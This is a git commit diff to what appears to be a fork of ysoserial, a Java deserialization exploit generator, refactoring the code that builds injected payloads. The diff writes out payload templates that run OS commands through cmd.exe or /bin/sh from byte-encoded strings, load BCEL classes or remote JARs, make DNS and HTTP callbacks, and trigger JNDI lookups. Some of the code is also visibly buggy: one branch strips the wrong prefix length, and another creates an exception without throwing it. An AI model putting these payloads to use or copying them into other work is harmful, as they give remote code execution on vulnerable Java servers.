9f158c0f39e54907c65323cc9070b58d71a9bd35
c0ny1 <1627639645@qq.com>
2021-04-04 02:21:18 +0800

    将所有命令统一定义

--- src/main/java/ysoserial/payloads/custom/CustomCommand.java
+++ src/main/java/ysoserial/payloads/custom/CustomCommand.java
@@ -1,8 +1,18 @@
 package ysoserial.payloads.custom;
 
 public class CustomCommand {
-    public static final String COMMAND_SCRIPT_FILE = "script_file:";
-    public static final String COMMAND_SCRIPT_BASE64 = "script_base64:";
-    public static final String COMMAND_UPLOADFILE = "uploadfile:";
-    public static final String COMMAND_LOADJAR  = "loadjar:";
+    public final static String COMMAND_SLEEP = "sleep:";
+    public final static String COMMAND_DNSLOG = "dnslog:";
+    public final static String COMMAND_HTTPLOG = "httplog:";
+    public final static String COMMAND_RAW_CMD = "raw_cmd:";
+    public final static String COMMAND_WIN_CMD = "win_cmd:";
+    public final static String COMMAND_LINUX_CMD = "linux_cmd:";
+    public final static String COMMAND_AUTO_CMD = "auto_cmd:";
+    public final static String COMMAND_BCEL = "bcel:";
+    public final static String COMMAND_BCEL_CLASS_FILE = "bcel_class_file:";
+    public final static String COMMAND_SCRIPT_FILE = "script_file:";
+    public final static String COMMAND_SCRIPT_BASE64 = "script_base64:";
+    public final static String COMMAND_UPLOADFILE = "uploadfile:";
+    public final static String COMMAND_LOADJAR  = "loadjar:";
+    public final static String COMMAND_JNDI = "jndi:";
 }
--- src/main/java/ysoserial/payloads/custom/TemplatesImplUtil.java
+++ src/main/java/ysoserial/payloads/custom/TemplatesImplUtil.java
@@ -3,29 +3,40 @@ package ysoserial.payloads.custom;
 import sun.misc.BASE64Decoder;
 import ysoserial.payloads.util.CommonUtil;
 import java.io.IOException;
-
 import static ysoserial.payloads.custom.CustomCommand.*;
 
 public class TemplatesImplUtil {
     public static String getCmd(String command) throws IOException {
         String cmd = null;
-        if(command.toLowerCase().startsWith("sleep:")) {
-            int time = Integer.valueOf(command.substring(6)) * 1000;
+        if(command.toLowerCase().startsWith(COMMAND_SLEEP)) {
+            int time = Integer.valueOf(command.substring(COMMAND_SLEEP.length())) * 1000;
             cmd = String.format("java.lang.Thread.sleep(%sL);",time);
-        } else if (command.toLowerCase().startsWith("dnslog:")){
-            String dnslogDomain = command.substring(7);
+        } else if (command.toLowerCase().startsWith(COMMAND_DNSLOG)){
+            String dnslogDomain = command.substring(COMMAND_DNSLOG.length());
             cmd = String.format("java.net.InetAddress.getAllByName(\"%s\");",dnslogDomain);
-        } else if (command.toLowerCase().startsWith("httplog:")){
-            String httplogURL = command.substring(8);
+        } else if (command.toLowerCase().startsWith(COMMAND_HTTPLOG)){
+            String httplogURL = command.substring(COMMAND_HTTPLOG.length());
             cmd = String.format("new java.net.URL(\"%s\").getContent();",httplogURL);
-        } else if (command.toLowerCase().startsWith("bcel:")) {
-            String bcel = command.substring(5);
-            cmd  = String.format("new com.sun.org.apache.bcel.internal.util.ClassLoader().loadClass(\"%s\").newInstance();",bcel);
-        } else if (command.toLowerCase().startsWith("bcel_class_file:")){
-            String bcelClassFile = command.substring(16);
-            String strBCEL = CommonUtil.classToBCEL(bcelClassFile);
-            cmd  = String.format("new com.sun.org.apache.bcel.internal.util.ClassLoader().loadClass(\"%s\").newInstance();",strBCEL);
-        } else if(command.toLowerCase().startsWith("auto_cmd:")){
+        } else if (command.toLowerCase().startsWith(COMMAND_RAW_CMD)){
+            String strCmd = command.substring(COMMAND_RAW_CMD.length());
+            String cmdByteArray = CommonUtil.stringToByteArrayString(strCmd);
+            /* 转义方式转换命令在某些复杂命令下依然存在问题，改用byte/string转换方式*/
+            /*cmd = "java.lang.Runtime.getRuntime().exec(\"" +
+                command.replaceAll("\\\\", "\\\\\\\\").replaceAll("\"", "\\\"") +
+                "\");";
+             */
+            cmd = String.format("java.lang.Runtime.getRuntime().exec(new java.lang.String(new byte[]{%s}));",cmdByteArray);
+        }  else if(command.toLowerCase().startsWith(COMMAND_WIN_CMD)){
+            String strCmd = command.substring(COMMAND_WIN_CMD.length());
+            String cmdByteArray = CommonUtil.stringToByteArrayString(strCmd);
+            cmd = String.format("String[] cmds = new String[]{\"cmd.exe\",\"/c\",new String(new byte[]{%s})};" +
+                "java.lang.Runtime.getRuntime().exec(cmds);",cmdByteArray);
+        } else if (command.toLowerCase().startsWith(COMMAND_LINUX_CMD)){
+            String strCmd = command.substring(COMMAND_AUTO_CMD.length());
+            String cmdByteArray = CommonUtil.stringToByteArrayString(strCmd);
+            cmd = String.format("String[] cmds = new String[]{\"/bin/sh\",\"-c\",new String(new byte[]{%s})};" +
+                "java.lang.Runtime.getRuntime().exec(cmds);",cmdByteArray);
+        }else if (command.toLowerCase().startsWith(COMMAND_AUTO_CMD)){
             /*
                 String[] cmds = null;
                 String osType = System.getProperty("os.name").toLowerCase();
@@ -36,7 +47,7 @@ public class TemplatesImplUtil {
                 }
                 java.lang.Runtime.getRuntime().exec(cmds);
              */
-            String strCmd = command.substring(9);
+            String strCmd = command.substring(COMMAND_AUTO_CMD.length());
             String cmdByteArray = CommonUtil.stringToByteArrayString(strCmd);
             cmd = String.format("String[] cmds = null;\n" +
                 "String osType = System.getProperty(\"os.name\").toLowerCase();\n" +
@@ -46,6 +57,13 @@ public class TemplatesImplUtil {
                 "    cmds = new String[]{\"/bin/sh\",\"-c\",new java.lang.String(new byte[]{%s})};\n" +
                 "}\n" +
                 "java.lang.Runtime.getRuntime().exec(cmds);",cmdByteArray,cmdByteArray);
+        } else if (command.toLowerCase().startsWith(COMMAND_BCEL)) {
+            String bcel = command.substring(COMMAND_BCEL.length());
+            cmd  = String.format("new com.sun.org.apache.bcel.internal.util.ClassLoader().loadClass(\"%s\").newInstance();",bcel);
+        } else if (command.toLowerCase().startsWith(COMMAND_BCEL_CLASS_FILE)){
+            String bcelClassFile = command.substring(COMMAND_BCEL_CLASS_FILE.length());
+            String strBCEL = CommonUtil.classToBCEL(bcelClassFile);
+            cmd  = String.format("new com.sun.org.apache.bcel.internal.util.ClassLoader().loadClass(\"%s\").newInstance();",strBCEL);
         } else if(command.toLowerCase().startsWith(COMMAND_SCRIPT_FILE)){
             String scriptFilePath = command.substring(COMMAND_SCRIPT_FILE.length());
             String scriptFileByteCode = CommonUtil.byteToByteArrayString(CommonUtil.readFileByte(scriptFilePath));
@@ -69,17 +87,11 @@ public class TemplatesImplUtil {
             String args = cmdInfo.split("|")[2];
             cmd = String.format("java.net.URLClassLoader classLoader = new java.net.URLClassLoader(new java.net.URL[]{new java.net.URL(\"%s\")});" +
                 "classLoader.loadClass(\"%s\").getConstructor(String.class).newInstance(\"%s\");",jarpath,className,args);
-        } else if (command.toLowerCase().contains("jndi:")){
-            String jndiURL = command.substring(5);
+        } else if (command.toLowerCase().contains(COMMAND_JNDI)){
+            String jndiURL = command.substring(COMMAND_JNDI.length());
             cmd = String.format("new javax.naming.InitialContext().lookup(\"%s\");",jndiURL);
         } else {
-            /* 转义方式转换命令在某些复杂命令下依然存在问题，改用byte/string转换方式*/
-            /*cmd = "java.lang.Runtime.getRuntime().exec(\"" +
-                command.replaceAll("\\\\", "\\\\\\\\").replaceAll("\"", "\\\"") +
-                "\");";
-             */
-
-            cmd = String.format("java.lang.Runtime.getRuntime().exec(new java.lang.String(new byte[]{%s}));",CommonUtil.stringToByteArray(command));
+            new Exception(String.format("%s is unspport!",command));
         }
         return cmd;
     }
